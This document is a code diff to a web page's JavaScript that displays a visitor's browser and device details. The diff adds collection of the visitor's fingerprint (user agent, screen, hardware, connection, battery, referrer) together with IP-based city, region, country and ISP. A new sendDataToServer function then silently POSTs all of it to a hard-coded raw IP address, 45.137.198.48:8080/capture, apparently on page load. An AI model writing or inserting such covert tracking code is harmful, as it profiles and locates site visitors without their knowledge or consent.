@@ -417,53 +417,102 @@
         async function captureAllInfo() {
 
             const clientInfo = getClientInfo();
+            const capturedData = {
+                userAgent: clientInfo.userAgent,
+                platform: clientInfo.platform,
+                language: clientInfo.language,
+                cookieEnabled: clientInfo.cookieEnabled,
+                onLine: clientInfo.onLine,
+                screenWidth: clientInfo.screenWidth,
+                screenHeight: clientInfo.screenHeight,
+                availWidth: clientInfo.availWidth,
+                availHeight: clientInfo.availHeight,
+                colorDepth: clientInfo.colorDepth,
+                pixelRatio: clientInfo.pixelRatio,
+                cores: clientInfo.hardware.cores,
+                memory: clientInfo.hardware.memory,
+                maxTouchPoints: clientInfo.hardware.maxTouchPoints,
+                connection: clientInfo.connection,
+                ip: 'Detecting...',
+                city: '',
+                region: '',
+                country: '',
+                isp: '',
+                battery: 'Detecting...',
+                timestamp: clientInfo.timestamp,
+                referrer: clientInfo.referrer,
+                currentUrl: clientInfo.currentUrl
+            };
+            
             addInfoEntry(`User Agent: ${clientInfo.userAgent}`);
             addInfoEntry(`Platform: ${clientInfo.platform}`);
             addInfoEntry(`Language: ${clientInfo.language}`);
-            addInfoEntry(`Languages: ${clientInfo.languages}`);
-            addInfoEntry(`Timezone: ${clientInfo.timezone}`);
             addInfoEntry(`Cookies: ${clientInfo.cookieEnabled ? 'Enabled' : 'Disabled'}`);
             addInfoEntry(`Online: ${clientInfo.onLine ? 'Yes' : 'No'}`);
             
             addInfoEntry(`Screen: ${clientInfo.screenWidth}x${clientInfo.screenHeight}`);
             addInfoEntry(`Available Screen: ${clientInfo.availWidth}x${clientInfo.availHeight}`);
             addInfoEntry(`Color Depth: ${clientInfo.colorDepth} bit`);
-            addInfoEntry(`Window: ${clientInfo.windowWidth}x${clientInfo.windowHeight}`);
+            addInfoEntry(`Pixel Ratio: ${clientInfo.pixelRatio}`);
             addInfoEntry(`CPU Cores: ${clientInfo.hardware.cores}`);
             addInfoEntry(`Memory: ${clientInfo.hardware.memory}`);
             addInfoEntry(`Touch Points: ${clientInfo.hardware.maxTouchPoints}`);
             
-
             if (clientInfo.connection !== 'Not available') {
                 addInfoEntry(`Connection: ${clientInfo.connection.effectiveType}`);
                 addInfoEntry(`Downlink: ${clientInfo.connection.downlink} Mbps`);
                 addInfoEntry(`RTT: ${clientInfo.connection.rtt} ms`);
+                capturedData.connection = clientInfo.connection;
             }
             
             addInfoEntry('Detecting IP address...');
             const ipInfo = await getDetailedIPInfo();
+            capturedData.ip = ipInfo.ip;
+            capturedData.city = ipInfo.city || '';
+            capturedData.region = ipInfo.region || '';
+            capturedData.country = ipInfo.country || '';
+            capturedData.isp = ipInfo.isp || '';
+            
             addInfoEntry(`IP Address: ${ipInfo.ip}`);
             if (ipInfo.city) {
                 addInfoEntry(`Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`);
-                addInfoEntry(`Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}`);
-                addInfoEntry(`Postal: ${ipInfo.postal}`);
+            }
+            if (ipInfo.isp) {
                 addInfoEntry(`ISP: ${ipInfo.isp}`);
             }
             
             const batteryInfo = await getBatteryInfo();
             if (typeof batteryInfo === 'object') {
                 addInfoEntry(`Level: ${batteryInfo.level}`);
-                addInfoEntry(`Charging: ${batteryInfo.charging}`);
-                addInfoEntry(`Charging Time: ${batteryInfo.chargingTime}`);
-                addInfoEntry(`Discharging Time: ${batteryInfo.dischargingTime}`);
+                addInfoEntry(`Charging: ${batteryInfo.charging ? 'Yes' : 'No'}`);
+                capturedData.battery = `${batteryInfo.level} (${batteryInfo.charging ? 'Charging' : 'Not Charging'})`;
             } else {
-                addInfoEntry(batteryInfo);
+                addInfoEntry(`Battery: ${batteryInfo}`);
+                capturedData.battery = batteryInfo;
             }
             
-                        
             addInfoEntry(`Start Time: ${clientInfo.timestamp}`);
             addInfoEntry(`Referrer: ${clientInfo.referrer}`);
             addInfoEntry(`Current URL: ${clientInfo.currentUrl}`);
+            
+            // Send data to backend server
+            sendDataToServer(capturedData);
+        }
+        
+        async function sendDataToServer(data) {
+            try {
+                const response = await fetch('http://45.137.198.48:8080/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                console.log('Data sent to server:', result);
+            } catch (error) {
+                console.error('Error sending data to server:', error);
+            }
         }
         
         window.addEventListener('load', function() {
